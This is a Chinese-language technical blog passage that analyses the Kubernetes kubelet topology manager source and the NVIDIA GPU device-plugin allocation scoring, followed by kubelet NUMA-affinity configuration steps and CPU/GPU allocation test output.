available：aligned.Union(allocated)，即numa对齐的资源和mustInclude资源的合集，如果aligned资源不满足request needed，则为available.Union(allocated) size：即request size: container.Resources.Limits  小结：\n  如果aligned资源不满足request needed，则调用GetPreferredAllocationIfAvailable接口时，可用资源参数为available.Union(allocated)，让插件进行可用设备资源预分配，此时分配资源不再满足numa对齐\n  这里kubelet远程调用插件的GetPreferredAllocationIfAvailable接口，只是告诉插件要可分配资源设备列表清单，最终可以让插件根据自身拓扑情况在设备列表（候选集）中优选pod容器所需size大小的资源。\n  下面是按topo分配的远程调用getPreferredAllocation\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  // callGetPreferredAllocationIfAvailable issues GetPreferredAllocation grpc // call for device plugin resource with GetPreferredAllocationAvailable option set. func (m *ManagerImpl) callGetPreferredAllocationIfAvailable(podUID, contName, resource string, available, mustInclude sets.String, size int) (sets.String, error) { resp, err := eI.e.getPreferredAllocation(available.UnsortedList(), mustInclude.UnsortedList(), size) return sets.NewString(resp.ContainerResponses[0].DeviceIDs...), nil } // getPreferredAllocation issues GetPreferredAllocation gRPC call to the device plugin. func (e *endpointImpl) getPreferredAllocation(available, mustInclude []string, size int) (*pluginapi.PreferredAllocationResponse, error) { if e.isStopped() { return nil, fmt.Errorf(errEndpointStopped, e) } return e.client.GetPreferredAllocation(context.Background(), \u0026amp;pluginapi.PreferredAllocationRequest{ ContainerRequests: []*pluginapi.ContainerPreferredAllocationRequest{ { AvailableDeviceIDs: available, MustIncludeDeviceIDs: mustInclude, AllocationSize: int32(size), }, }, }) }   GetPreferredAllocation从可用设备列表返回要分配的首选设备集。由此产生的首选分配不能保证最终由devicemanager执行。它的目的只是帮助devicemanager在可能的情况下做出更合理的分配决策\n注意  :(far fa-bookmark fa-fw):\nGetPreferredAllocation returns a preferred set of devices to allocate from a list of available ones. The resulting preferred allocation is not guaranteed to be the allocation ultimately performed by the devicemanager. It is only designed to help the devicemanager make a more informed allocation decision when possible.\n   最后根据devicesToAllocate返回要分配的资源 allocDevices，并调用远程接口allocate，通知deviceplugin进行资源分配\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  // allocateContainerResources attempts to allocate all of required device // plugin resources for the input container, issues an Allocate rpc request // for each new device resource requirement, processes their AllocateResponses, // and updates the cached containerDevices on success. func (m *ManagerImpl) allocateContainerResources(pod *v1.Pod, container *v1.Container, devicesToReuse map[string]sets.String) error { // ...  allocDevices, err := m.devicesToAllocate(podUID, contName, resource, needed, devicesToReuse[resource]) devs := allocDevices.UnsortedList() resp, err := eI.e.allocate(devs) // ...  // kubeelt更新deviceplugin快照，分配资源可按node.ID索引，如allocDevicesWithNUMA[node.ID]形式保存  allocDevicesWithNUMA := checkpoint.NewDevicesPerNUMA() // Update internal cached podDevices state.  for dev := range allocDevices { if m.allDevices[resource][dev].Topology == nil || len(m.allDevices[resource][dev].Topology.Nodes) == 0 { allocDevicesWithNUMA[0] = append(allocDevicesWithNUMA[0], dev) continue } for idx := range m.allDevices[resource][dev].Topology.Nodes { node := m.allDevices[resource][dev].Topology.Nodes[idx] allocDevicesWithNUMA[node.ID] = append(allocDevicesWithNUMA[node.ID], dev) } } m.podDevices.insert(podUID, contName, resource, allocDevicesWithNUMA, resp.ContainerResponses[0]) if needsUpdateCheckpoint { return m.writeCheckpoint() } }   接口 接口位置 kubernetes/staging/src/k8s.io/kubelet/pkg/apis/deviceplugin/v1beta1/api.proto\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  // DevicePlugin is the service advertised by Device Plugins service DevicePlugin { // GetDevicePluginOptions returns options to be communicated with Device  // Manager  rpc GetDevicePluginOptions(Empty) returns (DevicePluginOptions) {} // ListAndWatch returns a stream of List of Devices  // Whenever a Device state change or a Device disappears, ListAndWatch  // returns the new list  rpc ListAndWatch(Empty) returns (stream ListAndWatchResponse) {} // GetPreferredAllocation returns a preferred set of devices to allocate  // from a list of available ones. The resulting preferred allocation is not  // guaranteed to be the allocation ultimately performed by the  // devicemanager. It is only designed to help the devicemanager make a more  // informed allocation decision when possible.  rpc GetPreferredAllocation(PreferredAllocationRequest) returns (PreferredAllocationResponse) {} // Allocate is called during container creation so that the Device  // Plugin can run device specific operations and instruct Kubelet  // of the steps to make the Device available in the container  rpc Allocate(AllocateRequest) returns (AllocateResponse) {} // PreStartContainer is called, if indicated by Device Plugin during registeration phase,  // before each container start. Device plugin can run device specific operations  // such as resetting the device before making devices available to the container  rpc PreStartContainer(PreStartContainerRequest) returns (PreStartContainerResponse) {}}// ListAndWatch returns a stream of List of Devices // Whenever a Device state change or a Device disappears, ListAndWatch // returns the new list message ListAndWatchResponse { repeated Device devices = 1;}message TopologyInfo { repeated NUMANode nodes = 1;}message NUMANode { int64 ID = 1;}/* E.g: * struct Device { * ID: \u0026#34;GPU-fef8089b-4820-abfc-e83e-94318197576e\u0026#34;, * Health: \u0026#34;Healthy\u0026#34;, * Topology: * Node: * ID: 1 *} */message Device { // A unique ID assigned by the device plugin used  // to identify devices during the communication  // Max length of this field is 63 characters  string ID = 1; // Health of the device, can be healthy or unhealthy, see constants.go  string health = 2; // Topology for device  TopologyInfo topology = 3;}  NVIDIA k8s-device-plugin 插件版本：k8s-device-plugin-0.7.3\ngpu device 目前插件对分配策略的参数配置如下\n\u0026ldquo;nvidia.com/gpu\u0026quot;的GPU资源，默认采用BestEffortPolicy\n1 2 3 4 5 6 7 8  plugins := []*NvidiaDevicePlugin{ NewNvidiaDevicePlugin( \u0026#34;nvidia.com/gpu\u0026#34;, NewGpuDeviceManager(true), \u0026#34;NVIDIA_VISIBLE_DEVICES\u0026#34;, gpuallocator.NewBestEffortPolicy(), pluginapi.DevicePluginPath+\u0026#34;nvidia-gpu.sock\u0026#34;), }   处理流程 分析k8s-device-plugin对GetPreferredAllocation处理\n 对kubelet的请求参数AvailableDeviceIDs和MustIncludeDeviceIDs进行校验，构造available和required 按策略执行allocatePolicy.Allocate  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  // GetPreferredAllocation returns the preferred allocation from the set of devices specified in the request func (m *NvidiaDevicePlugin) GetPreferredAllocation(ctx context.Context, r *pluginapi.PreferredAllocationRequest) (*pluginapi.PreferredAllocationResponse, error) { response := \u0026amp;pluginapi.PreferredAllocationResponse{} for _, req := range r.ContainerRequests { available, err := gpuallocator.NewDevicesFrom(req.AvailableDeviceIDs) if err != nil { return nil, fmt.Errorf(\u0026#34;Unable to retrieve list of available devices: %v\u0026#34;, err) } required, err := gpuallocator.NewDevicesFrom(req.MustIncludeDeviceIDs) if err != nil { return nil, fmt.Errorf(\u0026#34;Unable to retrieve list of required devices: %v\u0026#34;, err) } allocated := m.allocatePolicy.Allocate(available, required, int(req.AllocationSize)) var deviceIds []string for _, device := range allocated { deviceIds = append(deviceIds, device.UUID) } resp := \u0026amp;pluginapi.ContainerPreferredAllocationResponse{ DeviceIDs: deviceIds, } response.ContainerResponses = append(response.ContainerResponses, resp) } return response, nil }   处理策略 GPU分配算法采用了策略模式，相关代码文件位置在 k8s-device-plugin\\vendor\\github.com\\NVIDIA\\go-gpuallocator\\gpuallocator\ngpu插件的资源分配算法已经封装为依赖包NVIDIA\\go-gpuallocator\nsimplePolicy 算法思想 先选required，再从set(available - required)中，选择满足size大小的gpus数。 该算法简单且没有考虑任何GPU拓扑连接\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  // Allocate GPUs following a simple policy. func (p *simplePolicy) Allocate(available []*Device, required []*Device, size int) []*Device { if size \u0026lt;= 0 { return []*Device{} } if len(available) \u0026lt; size { return []*Device{} } if len(required) \u0026gt; size { return []*Device{} } availableSet := NewDeviceSet(available...) if !availableSet.ContainsAll(required) { return []*Device{} } availableSet.Delete(required...) allocated := append([]*Device{}, required...) allocated = append(allocated, availableSet.SortedSlice()[:size-len(allocated)]...) return allocated }   bestEffortPolicy 算法思想\nAllocate从可用GPU设备列表中查找要分配的最佳大小GPU集，并返回它们。该算法旨在确保必需GPU设备的列表出现在最终分配中。\n 该算法考虑了大小为“size”的所有可能gpu集。然而，它并不满足于贪婪的解决方案，即寻找具有最高分数的单个大小集“size”。相反，当将节点上所有可用的gpu划分为大小为“size”的集合，然后将它们各自的分数相加时，它会寻找一种使总分最大化的解决方案。然后它返回该分组中具有最高得分的GPU集。\n 这种解决方案在一般情况下是必要的，因为各种链接的非层次性会影响每对gpu计算的分数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  // Allocate finds the best set of \u0026#39;size\u0026#39; GPUs to allocate from a list of // available GPU devices and returns them. The algorithm is designed to // ensure that a list of \u0026#39;required\u0026#39; GPU devices is present in the final // allocation. // // This algorithm considers all possible sets of GPUs of size \u0026#39;size\u0026#39;. // However, it does not settle for the greedy solution of looking for the // single set of size \u0026#39;size\u0026#39; with the highest score. Instead, it looks for a // solution that maximizes the total score when dividing up all available // GPUs on the node into sets of size \u0026#39;size\u0026#39; and then summing their // individual scores. It then returns the set of GPUs from that grouping // with the highest individual score. // // Such a solution is necessary in the general case because of the // non-hierarchical nature of the various links that influence the score // calculated for each pair of GPUs. func (p *bestEffortPolicy) Allocate(available []*Device, required []*Device, size int) []*Device { if size \u0026lt;= 0 { return []*Device{} } if len(available) \u0026lt; size { return []*Device{} } if len(required) \u0026gt; size { return []*Device{} } // Find the highest scoring GPU partition with sets of of size \u0026#39;size\u0026#39;.  // Don\u0026#39;t consider partitions that don\u0026#39;t have at least one set that contains  // all of the GPUs \u0026#39;required\u0026#39; by the allocation.  // 1. 计算出得分最高的gpu分区（分组），该分区需要满足要分配size大小，并包含全部的\u0026#39;required\u0026#39;  // gpuPartition对devices按size等分，e.g. [[0,1],[2,3]]；如果不能等分，则padding处理，填充devices。？？？  bestPartition := [][]*Device(nil) bestScore := 0 iterateGPUPartitions(available, size, func(candidate [][]*Device) { if !gpuPartitionContainsSetWithAll(candidate, required) { return } score := calculateGPUPartitionScore(candidate) if score \u0026gt; bestScore || bestPartition == nil { bestPartition = candidate bestScore = score } }) // Filter the \u0026#39;bestPartition\u0026#39; to only include sets containing all of the  // \u0026#39;required\u0026#39; devices (which may be nil so all sets will be valid).  filteredBestPartition := [][]*Device{} for _, set := range bestPartition { if gpuSetContainsAll(set, required) { filteredBestPartition = append(filteredBestPartition, set) } } if len(filteredBestPartition) == 0 { return []*Device{} } // Find the highest scoring GPU set in the highest scoring GPU partition.  // 在得分最高的分区中，找到得分最高的GPUset  bestSet := filteredBestPartition[0] bestScore = calculateGPUSetScore(bestSet) for i := 1; i \u0026lt; len(filteredBestPartition); i++ { score := calculateGPUSetScore(filteredBestPartition[i]) if score \u0026gt; bestScore { bestSet = filteredBestPartition[i] bestScore = score } } // Return the highest scoring GPU set.  return bestSet }   这里处理了gpuSet中的gpu拓扑得分，累计gpuSet中每对设备的得分PairScore，最后得出总分score\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  // Get the total score of a set of GPUs. The score is calculated as the sum of // the scores calculated for each pair of GPUs in the set. func calculateGPUSetScore(gpuSet []*Device) int { score := 0 iterateGPUSets(gpuSet, 2, func(gpus []*Device) { score += calculateGPUPairScore(gpus[0], gpus[1]) }) return score } // Calculate a \u0026#34;link\u0026#34; score for a pair of GPUs. // The score is based on the \u0026#34;closeness\u0026#34; of the two GPUs in relation to one // another in terms of the communication links they have with another, as well // as the PCIe hierarchy they are in. GPUs connected by an NVLINK receive 100 // points for each link connecting them. GPUs in the PCIe hierarchy receive // points relative to how close they are to one another. func calculateGPUPairScore(gpu0 *Device, gpu1 *Device) int { if gpu0 == nil || gpu1 == nil { return 0 } if gpu0 == gpu1 { return 0 } if len(gpu0.Links[gpu1.Index]) != len(gpu1.Links[gpu0.Index]) { err := fmt.Errorf(\u0026#34;Internal error in bestEffort GPU allocator: all P2PLinks between 2 GPUs should be bidirectional\u0026#34;) panic(err) } score := 0 for _, link := range gpu0.Links[gpu1.Index] { switch link.Type { case nvml.P2PLinkCrossCPU: score += 10 case nvml.P2PLinkSameCPU: score += 20 case nvml.P2PLinkHostBridge: score += 30 case nvml.P2PLinkMultiSwitch: score += 40 case nvml.P2PLinkSingleSwitch: score += 50 case nvml.P2PLinkSameBoard: score += 60 case nvml.SingleNVLINKLink: score += 100 case nvml.TwoNVLINKLinks: score += 200 case nvml.ThreeNVLINKLinks: score += 300 case nvml.FourNVLINKLinks: score += 400 case nvml.FiveNVLINKLinks: score += 500 case nvml.SixNVLINKLinks: score += 600 case nvml.SevenNVLINKLinks: score += 700 case nvml.EightNVLINKLinks: score += 800 case nvml.NineNVLINKLinks: score += 900 case nvml.TenNVLINKLinks: score += 1000 case nvml.ElevenNVLINKLinks: score += 1100 case nvml.TwelveNVLINKLinks: score += 1200 } } return score }   从上可以看出，NVLINKLinks的拓扑得分较高。各种link类型分值由高到低（各种vnlink先暂按同一类型SingleNVLINKLink）排列如下：\n   Link Type Score     NVLINKLinks 100   P2PLinkSameBoard 60   P2PLinkSingleSwitch 50   P2PLinkMultiSwitch 40   P2PLinkHostBridge 30   P2PLinkSameCPU 20   P2PLinkCrossCPU 10    小结：\n gpu插件优选gpu得分最高的gpu卡设备，所以满足nvlink拓扑亲和性的可用gpu卡设备会优先分配。 可用gpu卡设备需满足 GetPreferredAllocation接口参数要求  其它策略（暂时未用） 说明，插件项目中还有其他策略，但未使用，如下\n1 2 3 4 5  // Policy Definitions type staticDGX1PascalPolicy struct{} type staticDGX1VoltaPolicy struct{} type staticDGX2VoltaPolicy struct{}   gpu 拓扑 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  type P2PLinkType uint const ( P2PLinkUnknown P2PLinkType = iota P2PLinkCrossCPU P2PLinkSameCPU P2PLinkHostBridge P2PLinkMultiSwitch P2PLinkSingleSwitch P2PLinkSameBoard SingleNVLINKLink TwoNVLINKLinks ThreeNVLINKLinks FourNVLINKLinks FiveNVLINKLinks SixNVLINKLinks SevenNVLINKLinks EightNVLINKLinks NineNVLINKLinks TenNVLINKLinks ElevenNVLINKLinks TwelveNVLINKLinks ) func (t P2PLinkType) String() string { switch t { case P2PLinkCrossCPU: return \u0026#34;Cross CPU socket\u0026#34; case P2PLinkSameCPU: return \u0026#34;Same CPU socket\u0026#34; case P2PLinkHostBridge: return \u0026#34;Host PCI bridge\u0026#34; case P2PLinkMultiSwitch: return \u0026#34;Multiple PCI switches\u0026#34; case P2PLinkSingleSwitch: return \u0026#34;Single PCI switch\u0026#34; case P2PLinkSameBoard: return \u0026#34;Same board\u0026#34; case SingleNVLINKLink: return \u0026#34;Single NVLink\u0026#34; case TwoNVLINKLinks: return \u0026#34;Two NVLinks\u0026#34; case ThreeNVLINKLinks: return \u0026#34;Three NVLinks\u0026#34; case FourNVLINKLinks: return \u0026#34;Four NVLinks\u0026#34; case FiveNVLINKLinks: return \u0026#34;Five NVLinks\u0026#34; case SixNVLINKLinks: return \u0026#34;Six NVLinks\u0026#34; case SevenNVLINKLinks: return \u0026#34;Seven NVLinks\u0026#34; case EightNVLINKLinks: return \u0026#34;Eight NVLinks\u0026#34; case NineNVLINKLinks: return \u0026#34;Nine NVLinks\u0026#34; case TenNVLINKLinks: return \u0026#34;Ten NVLinks\u0026#34; case ElevenNVLINKLinks: return \u0026#34;Eleven NVLinks\u0026#34; case TwelveNVLINKLinks: return \u0026#34;Twelve NVLinks\u0026#34; case P2PLinkUnknown: } return \u0026#34;N/A\u0026#34; }   插件实例创建时NewDevices，会构造device信息，其中包括GPU拓扑连接信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  // Device represents a GPU device as reported by NVML, including all of its // Point-to-Point link information. type Device struct { *nvml.Device Index int Links map[int][]P2PLink } // P2PLink represents a Point-to-Point link between two GPU devices. The link // is between the Device struct this struct is embedded in and the GPU Device // contained in the P2PLink struct itself. type P2PLink struct { GPU *Device Type nvml.P2PLinkType } // DeviceSet is used to hold and manipulate a set of unique GPU devices. type DeviceSet map[string]*Device // Create a list of Devices from all available nvml.Devices. func NewDevices() ([]*Device, error) { devices = append(devices, \u0026amp;Device{device, i, make(map[int][]P2PLink)}) for i, d1 := range devices { for j, d2 := range devices { if d1 != d2 { p2plink, err := nvml.GetP2PLink(d1.Device, d2.Device) if err != nil { return nil, fmt.Errorf(\u0026#34;error getting P2PLink for devices (%v, %v): %v\u0026#34;, i, j, err) } if p2plink != nvml.P2PLinkUnknown { d1.Links[d2.Index] = append(d1.Links[d2.Index], P2PLink{d2, p2plink}) } nvlink, err := nvml.GetNVLink(d1.Device, d2.Device) if err != nil { return nil, fmt.Errorf(\u0026#34;error getting NVLink for devices (%v, %v): %v\u0026#34;, i, j, err) } if nvlink != nvml.P2PLinkUnknown { d1.Links[d2.Index] = append(d1.Links[d2.Index], P2PLink{d2, nvlink}) } } } } return devices, nil }   总结  kubelet根据所在节点可用资源和numa对齐准则，提供资源分配建议topo hint cpu资源分配，在cpu static分配策略下，由cpumanager根据计算好的topo hint进行cpuset分配 gpu资源分配：则由kubelet和gpu插件共同作用完成  kubelet会计算topo hint，并远程调用gpu插件的GetPreferredAllocation，提供gpu分配建议，包括request、available、size等 gpu插件根据分配建议，在bestEffortPolicy策略下，还会计算gpu device的拓扑得分，然后优选gpuset，并把该gpuset的devices返回给kubelet kbuelet根据gpu插件确认后的gpu devices，再校验处理，调用allocate，通知gpu插件进行资源分配   ","permalink":"http://bingerambo.com/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","tags":["K8S"],"title":"K8S affinity topology feature源码分析"},{"categories":["K8S"],"contents":"1.20版本已经有了kubelet的numa亲和性资源（CPU和GPU）分配功能（与1.18版本的beta接口相同），本文记录操作要点\n配置kubelet  添加kubelet中numa相关的运行命令参数  1  --cpu-manager-policy=static --topology-manager-policy=best-effort   kubelet的cpu-manager策略默认是none，会分配系统全部cpuset。这里需要显示指定策略\ntopology-manager-policy这里根据项目场景需要，配置best-effort：优选分配numa拓扑亲和性的资源，如果numa亲和性不满足，则分配系统可用资源。\ncpu-manager策略默认配置  1 2  [root@gpu53 ~]# cat /var/lib/kubelet/cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;none\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;checksum\u0026#34;:1353318690}   cpu-manager策略static配置  1 2  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0,4-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;39b37746-7f5e-4064-b8e1-eebd2bfaa003\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;1-3\u0026#34;}},\u0026#34;checksum\u0026#34;:3300516549}   topology-manager-policy 注意  :(far fa-bookmark fa-fw): 说明\n none: this policy will not attempt to do any alignment of resources. It will act the same as if the TopologyManager were not present at all. This is the default policy. best-effort: with this policy, the TopologyManager will attempt to align allocations on NUMA nodes as best it can, but will always allow the pod to start even if some of the allocated resources are not aligned on the same NUMA node. restricted: this policy is the same as the best-effort policy, except it will fail pod admission if allocated resources cannot be aligned properly. Unlike with the single-numa-node policy, some allocations may come from multiple NUMA nodes if it is impossible to ever satisfy the allocation request on a single NUMA node (e.g. 2 devices are requested and the only 2 devices on the system are on different NUMA nodes). single-numa-node: this policy is the most restrictive and will only allow a pod to be admitted if all requested CPUs and devices can be allocated from exactly one NUMA node.     kubelet.env配置示例 /etc/kubernetes/kubelet.env\n即在原有配置上增加 \u0026ndash;cpu-manager-policy=static \u0026ndash;topology-manager-policy=best-effort\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  [root@node2 kubelet]# cat /etc/kubernetes/kubelet.env KUBE_LOGTOSTDERR=\u0026#34;--logtostderr=true\u0026#34; KUBE_LOG_LEVEL=\u0026#34;--v=2\u0026#34; KUBELET_ADDRESS=\u0026#34;--node-ip=10.151.11.61\u0026#34; KUBELET_HOSTNAME=\u0026#34;--hostname-override=node2\u0026#34; KUBELET_ARGS=\u0026#34;--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf \\ --config=/etc/kubernetes/kubelet-config.yaml \\ --kubeconfig=/etc/kubernetes/kubelet.conf \\ --pod-infra-container-image=k8s.gcr.io/pause:3.2 \\ --authentication-token-webhook \\ --enforce-node-allocatable=\u0026#34;\u0026#34; \\ --client-ca-file=/etc/kubernetes/ssl/ca.crt \\ --rotate-certificates \\ --node-status-update-frequency=10s \\ --cgroup-driver=systemd \\ --cgroups-per-qos=False \\ --max-pods=110 \\ --anonymous-auth=false \\ --read-only-port=0 \\ --fail-swap-on=True \\ --runtime-cgroups=/systemd/system.slice --kubelet-cgroups=/systemd/system.slice \\ --cluster-dns=10.233.0.3 --cluster-domain=cluster.local --resolv-conf=/etc/resolv.conf --node-labels= --eviction-hard=\u0026#34;\u0026#34; --image-gc-high-threshold=100 --image-gc-low-threshold=99 --kube-reserved cpu=100m --system-reserved cpu=100m \\ --cpu-manager-policy=static --topology-manager-policy=best-effort \\ \u0026#34; KUBELET_NETWORK_PLUGIN=\u0026#34;--network-plugin=cni --cni-conf-dir=/etc/cni/net.d --cni-bin-dir=/opt/cni/bin\u0026#34; KUBELET_CLOUDPROVIDER=\u0026#34;\u0026#34; PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   kubelet重启 注意：kubelet修改cpu_manager策略配置，一定要停掉kubelet服务，并删除/var/lib/kubelet/cpu_manager_state文件，再重启kubelet，否则会导致kubelet服务重启失败。\n启动GPU k8s插件 需要支持CPUManager static policy 这里采用镜像方式启动，详细操作参考K8S GPU DEVICEPLUGIN\n1 2 3 4 5 6 7  docker run \\  -it \\  --privileged \\  --network=none \\  -v /var/lib/kubelet/device-plugins:/var/lib/kubelet/device-plugins \\  nvidia/k8s-device-plugin:devel --pass-device-specs   kubelet的快照文件  cpu_manager_state：CPU管理器快照文件，包含cpu分配策略和已分配pod的cpuset信息 device-plugins/kubelet_internal_checkpoint：deviceplugin的快照信息，这里关注测试numa亲和性分配相关的TOPO分配信息  GPU命令 GPU uuid 1  nvidia-smi -L   显示如下，查询到INDEX -\u0026gt; UUID：\n1 2 3 4  [root@node2 ~]# nvidia-smi -L GPU 0: Tesla P100-PCIE-16GB (UUID: GPU-77a702db-e37f-3a74-d46d-c5713f66058c) GPU 1: Tesla P100-PCIE-16GB (UUID: GPU-9b341c59-f96b-ba85-c137-78c3652fea65) GPU 2: Tesla P100-PCIE-16GB (UUID: GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841)   GPU 详细信息 1  lspci | grep -i nvidia   1 2 3 4 5  [root@node2 ~]# lspci | grep -i nvidia 3b:00.0 3D controller: NVIDIA Corporation GP100GL [Tesla P100 PCIe 16GB] (rev a1) 86:00.0 3D controller: NVIDIA Corporation GP100GL [Tesla P100 PCIe 16GB] (rev a1) d8:00.0 3D controller: NVIDIA Corporation GP100GL [Tesla P100 PCIe 16GB] (rev a1)   前边的序号 \u0026ldquo;3b:00.0\u0026quot;是显卡的代号;\n查看指定显卡的详细信息用以下指令：\n1  lspci -v -s 3b:00.0   这里能看到NUMA node 1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  [root@node2 ~]# lspci -v -s d8:00.0 d8:00.0 3D controller: NVIDIA Corporation GP100GL [Tesla P100 PCIe 16GB] (rev a1) Subsystem: NVIDIA Corporation Device 118f Flags: bus master, fast devsel, latency 0, IRQ 441, NUMA node 1 Memory at fa000000 (32-bit, non-prefetchable) [size=16M] Memory at 39f800000000 (64-bit, prefetchable) [size=16G] Memory at 39fc00000000 (64-bit, prefetchable) [size=32M] Capabilities: [60] Power Management version 3 Capabilities: [68] MSI: Enable+ Count=1/1 Maskable- 64bit+ Capabilities: [78] Express Endpoint, MSI 00 Capabilities: [100] Virtual Channel Capabilities: [258] L1 PM Substates Capabilities: [128] Power Budgeting \u0026lt;?\u0026gt; Capabilities: [420] Advanced Error Reporting Capabilities: [600] Vendor Specific Information: ID=0001 Rev=1 Len=024 \u0026lt;?\u0026gt; Capabilities: [900] #19 Kernel driver in use: nvidia Kernel modules: nouveau, nvidia_drm, nvidia   GPU拓扑 1  nvidia-smi topo -mp   GPU0属于NUMA组0，GPU1和GPU2属于NUMA组1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  [root@node2 numa_test]# nvidia-smi topo -mp GPU0 GPU1 GPU2 CPU Affinity NUMA Affinity GPU0 X SYS SYS 0-13 0 GPU1 SYS X NODE 14-27 1 GPU2 SYS NODE X 14-27 1 Legend: X = Self SYS = Connection traversing PCIe as well as the SMP interconnect between NUMA nodes (e.g., QPI/UPI) NODE = Connection traversing PCIe as well as the interconnect between PCIe Host Bridges within a NUMA node PHB = Connection traversing PCIe as well as a PCIe Host Bridge (typically the CPU) PXB = Connection traversing multiple PCIe bridges (without traversing the PCIe Host Bridge) PIX = Connection traversing at most a single PCIe bridge   测试 CPU numa亲和性  资源占用和释放：启动pod[3c]，并删除该pod  占用3个cpu后，再释放：\n1 2 3 4 5 6  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0,4-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;39b37746-7f5e-4064-b8e1-eebd2bfaa003\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;1-3\u0026#34;}},\u0026#34;checksum\u0026#34;:3300516549} [root@node2 kubelet]# kubectl delete po cpu-numa-batch-pod pod \u0026#34;cpu-numa-batch-pod\u0026#34; deleted [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0-27\u0026#34;,\u0026#34;checksum\u0026#34;:273146150}   环境资源未占用  1 2  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0,14-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;c0c5c4b3-3f63-4677-ba68-52da74012371\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;1-13\u0026#34;}},\u0026#34;checksum\u0026#34;:1954249489}   占用一个numa组的cpu资源，14个cpu  1 2  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0-13\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;6c5f3038-adfc-485d-9943-3fd5e825300d\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-27\u0026#34;}},\u0026#34;checksum\u0026#34;:3451722052}   启动2个pod，pod1 占用14c，pod2占用12c  1 2  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0,13\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;55784671-0e4e-49e2-b4d6-c0377ca14c81\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;1-12\u0026#34;},\u0026#34;6c5f3038-adfc-485d-9943-3fd5e825300d\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-27\u0026#34;}},\u0026#34;checksum\u0026#34;:3558029577}   GPU+CPU numa亲和性  pod请求2个GPU，0个cpu  1 2 3 4 5 6 7  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0-27\u0026#34;,\u0026#34;checksum\u0026#34;:273146150}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint 